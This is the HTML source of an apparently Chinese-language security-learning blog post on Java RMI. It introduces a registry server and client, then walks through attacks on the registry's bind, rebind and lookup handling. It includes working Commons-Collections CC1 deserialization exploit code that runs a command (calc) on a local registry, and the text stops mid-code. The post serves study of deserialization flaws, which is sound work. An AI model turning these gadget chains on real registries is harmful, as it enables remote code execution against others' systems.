@@ -1,0 +1,396 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>RMI | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="RMI概述RMI（Remote Method Invocation）是计算机之间通过网络实现对象调用的一种通讯机制。它允许在Java虚拟机（JVM）之间进行通信，使得在一个JVM中的对象可以调用另一个JVM中的对象的方法，就像这些对象都在同一个JVM中一样。	
+服务端（Server）：
+
+服务端创建一个远程对象，并实现一个或多个远程接口。
+服务端启动 RMI 注册表，并将远程对象绑定到注册表中。
+
+客户端（Client）：
+
+客户端从 RMI 注册表中查找所需的远程对象。
+客户端获取远程对象的引用，并调用其方法。
+
+测试环境：JDK8u41
+RMIServer.java
+12345678910111213141516171819202122232425262728293031323334353637383940import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.UnicastRemoteObject;public class RMIServer &amp;#123;    // 接口    public interface IRemoteObj extends Remote &amp;#123;        public String hello(String para) throws RemoteException;    &amp;#125;    public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj &amp;#123;        protected RemoteObjImpl() throws RemoteException &amp;#123;            super();        &amp;#125;        public String hello(String para) throws RemoteException &amp;#123;            System.out.println(para);            return &amp;quot;over&amp;quot;;        &amp;#125;    &amp;#125;    private void start() throws Exception &amp;#123;        // 实例化远程对象        RemoteObjImpl h = new RemoteObjImpl();        // 创建注册中心        LocateRegistry.createRegistry(1099);        // 绑定对象示例到注册中心        Naming.rebind(&amp;quot;rmi://127.0.0.1:1099/Remote&amp;quot;, h);        // Naming.rebind(静态方法) 和 registry.bind(实例方法) 都是将一个远程对象绑定到 RMI 注册表中,Naming.rebind()方法是JNDI的一部分//        RemoteObjImpl h = new RemoteObjImpl();//        Registry registry = LocateRegistry.createRegistry(1099);//        registry.bind(&amp;quot;Remote&amp;quot;, h);    &amp;#125;    public static void main(String[] args) throws Exception &amp;#123;        new RMIServer().start();    &amp;#125;&amp;#125;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="RMI"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> RMI</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>RMI（Remote Method Invocation）是计算机之间通过网络实现对象调用的一种通讯机制。它允许在Java虚拟机（JVM）之间进行通信，使得在一个JVM中的对象可以调用另一个JVM中的对象的方法，就像这些对象都在同一个JVM中一样。	</p>
+<p><strong>服务端（Server）：</strong></p>
+<ul>
+<li>服务端创建一个远程对象，并实现一个或多个远程接口。</li>
+<li>服务端启动 RMI 注册表，并将远程对象绑定到注册表中。</li>
+</ul>
+<p><strong>客户端（Client）：</strong></p>
+<ul>
+<li>客户端从 RMI 注册表中查找所需的远程对象。</li>
+<li>客户端获取远程对象的引用，并调用其方法。</li>
+</ul>
+<p><strong>测试环境：JDK8u41</strong></p>
+<p>RMIServer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="comment">// 接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String para)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String para)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(para);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;over&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象</span></span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="comment">// 创建注册中心</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 绑定对象示例到注册中心</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Remote&quot;</span>, h);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Naming.rebind(静态方法) 和 registry.bind(实例方法) 都是将一个远程对象绑定到 RMI 注册表中,Naming.rebind()方法是JNDI的一部分</span></span><br><span class="line"><span class="comment">//        RemoteObjImpl h = new RemoteObjImpl();</span></span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.createRegistry(1099);</span></span><br><span class="line"><span class="comment">//        registry.bind(&quot;Remote&quot;, h);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>RMIClient.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteObj</span> <span class="variable">h</span> <span class="operator">=</span> (RMIServer.IRemoteObj)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Remote&quot;</span>);</span><br><span class="line">        System.out.println(h.hello(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// java.rmi.registry.Registry</span></span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span></span><br><span class="line"><span class="comment">//        RMIServer.IRemoteObj remoteObj = (RMIServer.IRemoteObj) registry.lookup(&quot;Remote&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(remoteObj.hello(&quot;hello world&quot;));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h3><p>与注册中心进行交互方法：list、bind、rebind、unbind、lookup</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Remote&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br></pre></td></tr></table></figure>
+
+<p>这几种方法位于<code>RegistryImpl_Skel#dispatch</code>中，如果存在对传入的对象调用<code>readObject()</code>方法，则可以利用<code>dispatch</code>里面对应如下：</p>
+<ul>
+<li>0 —– bind</li>
+<li>1 —– list</li>
+<li>2 —– lookup</li>
+<li>3 —– rebind</li>
+<li>4 —– unbind</li>
+</ul>
+<h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>只有<code>writeObject()</code>，没有<code>readObject()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegistryListAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] s = Naming.list(<span class="string">&quot;rmi://127.0.0.1:1099&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240319202514423.png" alt="image-20240319202514423"></p>
+<h4 id="bind-或-rebind"><a href="#bind-或-rebind" class="headerlink" title="bind 或 rebind"></a>bind 或 rebind</h4><p>Server 端在执行 bind 或者 rebind 方法的时候会将对象以序列化的形式传输给 Registry，导致 Registry 反序列化被 RCE</p>
+<p><strong>CC依赖</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>CC1_TransformedMap</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1_TransformedMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  // test</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) CC1_TransformedMap();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240319204757003.png" alt="image-20240319204757003"></p>
+<h4 id="lookup-或-unbind"><a href="#lookup-或-unbind" class="headerlink" title="lookup 或 unbind"></a>lookup 或 unbind</h4><p>lookup 方法接收一个 String 类型的参数，无法直接利用，需要手动模拟 RegistryImpl_Stub#lookup 方法传递过程</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240320191230107.png" alt="image-20240320191230107"></p>
+<p>lookup 学习 lookupEXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.corba.se.spi.orb.Operation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryEXP02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) CC1_TransformedMap();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, invocationHandler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, (java.rmi.server.Operation[]) operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1_TransformedMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  // test</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span 